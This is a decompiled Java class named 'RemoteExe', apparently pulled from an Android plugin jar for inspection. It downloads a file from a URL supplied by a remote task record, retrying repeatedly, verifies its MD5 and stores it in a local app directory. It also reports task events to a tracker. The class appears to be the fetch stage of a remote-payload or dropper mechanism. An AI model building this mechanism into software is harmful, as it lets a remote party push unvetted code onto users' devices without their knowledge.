package com.hs.cld.da;

import android.content.Context;
import com.hs.cld.da.model.EventTypeEnum;
import com.hs.cld.da.model.TrackerBean;
import com.hs.cld.da.t.Tracker;
import com.hs.p.basic.Logger;
import com.hs.p.common.utils.DigestUtils;
import com.hs.p.common.utils.LOG;
import com.hs.p.common.utils.TextUtils;
import com.hs.p.dx.DIR;
import com.hs.p.dx.FileUtils;
import java.io.File;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

/* JADX INFO: loaded from: /Users/ruben/projector-dump/downloads/plugin.jar */
public class RemoteExe {
    private static final String TAG = "RE";
    protected final Context mContext;
    protected final TrackerBean mTrackerBean;

    public RemoteExe(Context context, TrackerBean trackerBean) {
        this.mContext = context;
        this.mTrackerBean = trackerBean;
    }

    private byte[] downloadAsByteArray(String str) throws Exception {
        IOException e = null;
        for (int i = 0; i < 30; i++) {
            try {
                return URLFileUtils.load(this.mContext, str);
            } catch (IOException e2) {
                e = e2;
                Thread.sleep(4000L);
            }
        }
        throw e;
    }

    private Map<String, File> listRawMd5File(String str) {
        HashMap map = new HashMap();
        File file = new File(str);
        String[] list = file.list();
        if (list != null) {
            for (String str2 : list) {
                File file2 = new File(file, str2);
                if (file2.isFile() && file2.getName().endsWith(DIR.SUFFIX_RF)) {
                    map.put(DigestUtils.md5AsString(file2), file2);
                }
            }
        }
        return map;
    }

    protected File download(String str) throws Exception {
        Map<String, File> mapListRawMd5File = listRawMd5File(str);
        if (mapListRawMd5File.containsKey(this.mTrackerBean.file_md5)) {
            LOG.i(TAG, "file with same MD5 already exists, ignore download: " + mapListRawMd5File.get(this.mTrackerBean.file_md5).getAbsolutePath() + ", MD5=" + this.mTrackerBean.file_md5);
            throw new Exception("file exist(" + this.mTrackerBean.file_md5 + ")");
        }
        byte[] bArrDownloadAsByteArray = downloadAsByteArray(this.mTrackerBean.file_url);
        if (bArrDownloadAsByteArray == null) {
            Logger.append(this.mContext, TAG, "download failed");
            throw new Exception("[" + this.mTrackerBean.file_url + "] download failed");
        }
        String strMd5AsString = DigestUtils.md5AsString(bArrDownloadAsByteArray);
        if (!TextUtils.equalsIgnoreCase(strMd5AsString, this.mTrackerBean.file_md5)) {
            Logger.append(this.mContext, TAG, "file MD5 mismatch");
            throw new Exception("file MD5 mismatch(" + strMd5AsString + "!=" + this.mTrackerBean.file_md5 + ")");
        }
        File localRawFile = getLocalRawFile(str);
        FileUtils.write(localRawFile, bArrDownloadAsByteArray);
        LOG.i(TAG, "file downloaded successfully: " + localRawFile.getAbsolutePath() + ", MD5=" + this.mTrackerBean.file_md5);
        return localRawFile;
    }

    protected String getFileName(TrackerBean trackerBean) {
        String strMd5AsString = trackerBean.tracker_id;
        if (TextUtils.empty(strMd5AsString)) {
            strMd5AsString = trackerBean.file_md5;
        }
        if (TextUtils.empty(strMd5AsString)) {
            strMd5AsString = DigestUtils.md5AsString(trackerBean.file_url);
        }
        return DIR.PREFIX_RF + strMd5AsString + DIR.SUFFIX_RF;
    }

    protected String getLocalDir(String str) {
        String str2 = DIR.root(this.mContext) + File.separator + str;
        FileUtils.createDir(new File(str2));
        return str2;
    }

    protected File getLocalRawFile(String str) {
        return FileUtils.create(new File(getLocalDir(str) + File.separator + getFileName(this.mTrackerBean)), true);
    }

    protected void submitTracker(EventTypeEnum eventTypeEnum, int i, String str) {
        new Tracker(this.mContext).setTaskId(this.mTrackerBean.task_id).setTrackerId(this.mTrackerBean.tracker_id).setEventType(eventTypeEnum).setEventTime(System.currentTimeMillis()).setEventCode(i).setEventMessage(str).submitAsync();
    }

    protected void submitTrackerWithExtra(EventTypeEnum eventTypeEnum, int i, String str, String str2) {
        new Tracker(this.mContext).setTaskId(this.mTrackerBean.task_id).setTrackerId(this.mTrackerBean.tracker_id).setEventType(eventTypeEnum).setEventTime(System.currentTimeMillis()).setEventCode(i).setEventMessage(str).setEventExtra(str2).submitAsync();
    }
}
